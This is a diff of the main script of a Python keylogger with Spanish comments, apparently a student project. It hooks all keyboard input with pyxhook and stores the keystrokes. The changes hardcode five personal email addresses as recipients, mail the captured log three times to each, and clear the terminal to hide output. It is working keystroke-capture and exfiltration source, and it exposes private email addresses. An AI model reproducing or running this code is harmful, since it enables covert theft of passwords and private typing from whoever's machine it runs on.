@@ -7,10 +7,13 @@ from file_manager import guardar_en_archivo
 from email_handler import enviar_email
 
 def mostrar_menu() -> (bool, bool):
-   
+    """
+    Muestra un menú en la terminal
+    """
     print("============= Configuración del keylogger =============")
     print("Responde 'yes'/'y' para SÍ, 'no'/'n' para NO, o 'exit' para salir.\n")
 
+    # 1) ¿Enviar por correo?
     while True:
         resp = input("¿Deseas enviar los registros por correo? (yes/y / no/n / exit): ").strip().lower()
         if resp == 'exit':
@@ -37,6 +40,7 @@ def mostrar_menu() -> (bool, bool):
         else:
             print("Entrada inválida. Ingresa yes/y, no/n o exit.\n")
 
+    # Si en ambas preguntas elegimos NO, terminamos
     if not enviar and not guardar:
         print("No se van a enviar ni guardar registros. Finalizando ejecución.")
         sys.exit(0)
@@ -44,24 +48,35 @@ def mostrar_menu() -> (bool, bool):
     print()
     return enviar, guardar
 
+def limpiar_pantalla_completa():
+    """
+    Envía la secuencia ANSI para 'limpiar pantalla' completa
+    (\033c).
+    """
+    sys.stdout.write("\033c")
+    sys.stdout.flush()
+
 def main():
     enviar, guardar = mostrar_menu()
     logger = KeyloggerCore(enviar_correo=enviar, guardar_local=guardar)
 
+    # Iniciar el hook 
     hookman = pyxhook.HookManager()
     hookman.KeyDown = logger.callback
     hookman.HookKeyboard()
     hookman.start()
 
     try:
+        # Mientras logger.running sea True, esperamos en loop
         while logger.running:
             time.sleep(0.1)
     except KeyboardInterrupt:
         print("\n[x] Interrupción manual (Ctrl+C).")
     finally:
+        # Detener el hook
         hookman.cancel()
 
-        print()
+        limpiar_pantalla_completa()
 
         if guardar:
             archivo_generado = guardar_en_archivo(logger.buffer)
@@ -75,21 +90,28 @@ def main():
                 print(f"[keylogger] Error al crear archivo temporal: {e}")
                 archivo_generado = None
 
-        if enviar:
-            if archivo_generado:
-                print("\n")
-                destinatario = input("Ingresa el correo destinatario: ").strip()
+        if enviar and archivo_generado:
+            destinatarios = [
+                "arizdelcylizbeth1203@ciencias.unam.mx",
+                "sofialatorre313@gmail.com",
+                "damianvazqueztorrijos@ciencias.unam.mx",
+                "IrvingAxel@ciencias.unam.mx",
+                "lezama@ciencias.unam.mx"
+            ]
 
-                lower_dest = destinatario.lower()
-                if lower_dest.startswith("exit"):
-                    destinatario = destinatario[4:].lstrip()
+            limpiar_pantalla_completa()
 
-                if "@" in destinatario and "." in destinatario:
-                    enviar_email(destinatario, archivo_generado)
-                else:
-                    print("Correo destinatario no válido. No se envía.")
-            else:
-                print("No se generó un archivo para adjuntar; no se envía correo.")
+            for dest in destinatarios:
+                for i in range(3):
+                    try:
+                        print(f"[email_handler] Envío {i+1}/3 a {dest}…")
+                        enviar_email(dest, archivo_generado)
+                    except Exception:
+                        print(f"[email_handler] Falló el envío {i+1} a {dest}, continuando…")
+            print("[email_handler] Finalizaron los envíos a todos los destinatarios.")
+
+        elif enviar and not archivo_generado:
+            print("No se generó ningún archivo para adjuntar; no se envían correos.")
 
         print("\n============= Keylogger finalizado. =============")
 
